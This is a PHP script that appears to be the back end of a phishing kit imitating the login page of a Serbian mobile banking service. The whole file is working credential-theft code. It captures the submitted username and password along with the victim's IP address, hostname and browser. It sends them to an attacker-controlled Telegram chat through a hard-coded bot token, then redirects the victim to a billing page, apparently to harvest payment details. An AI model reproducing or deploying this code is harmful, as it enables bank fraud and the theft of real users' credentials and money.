<?php



    $ip = getenv("REMOTE_ADDR");
    $message .= "--------------------AnTiBoTs7-------------------\n";
    $message .= "--------------  MOBIBANKA  SERBIA -------------\n";
    $message .= "UserName       : " . $_POST['UserName'] . "\n";
    $message .= "PASSWORD        : " . $_POST['Password'] . "\n";
    $message .= "-------------- IP Infos ------------\n";
    $message .= "IP      : $ip\n";
    $message .= "HOST    : " . gethostbyaddr($ip) . "\n";
    $message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "----------------------AnTiBoTs7----------------------\n";
    $cc = $_POST['ccn'];
    $subject = "NEW ACCOUNT | ♥__♥ | IP : $ip\n ";
    $headers = "From: <noreply@antibots7.com>\n";

      
   


    $botToken="2064577149:AAGwlvULbwuGJ5viekIPMxKardywDI1obDU";

    $website="https://api.telegram.org/bot".$botToken;

    $params=[
          'chat_id'=>"6417239870",
          'text'=>"$message",
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);


    header("Location: ./billing.html"); 
    exit();


?>
